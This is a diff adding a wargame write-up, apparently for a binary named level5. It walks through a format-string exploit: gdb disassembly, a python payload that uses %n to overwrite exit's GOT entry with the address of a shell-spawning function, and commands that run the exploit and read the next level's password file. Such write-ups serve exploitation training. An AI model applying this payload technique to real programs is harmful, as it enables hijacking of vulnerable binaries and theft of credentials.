@@ -1,1 +1,24 @@
+binary calls to fgets and printf
+we can see that we can overwrite the adress of the first jmp in exit fonction
+
+(gdb) disass exit
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:     jmp    *0x8049838
+   0x080483d6 <+6>:     push   $0x28
+   0x080483db <+11>:    jmp    0x8048370
+End of assembler dump.
+
+we know the adress of fonction o that can spawn a shell for us its 0x080484a4
+Dump of assembler code for function o:
+   0x080484a4 <+0>:     push   %ebp
+   0x080484a5 <+1>:     mov    %esp,%ebp
+   0x080484a7 <+3>:     sub    $0x18,%esp
+   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
+   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
+   0x080484b6 <+18>:    movl   $0x1,(%esp)
+   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
+
+so we need to write 134513828 chars with %n
 python -c 'print("\x08\x04\x98\x38"[::-1] + " %134513800p %p %p %n")' > /tmp/test
+cat /tmp/test - | ./level5
+cat /home/user/level6/.pass
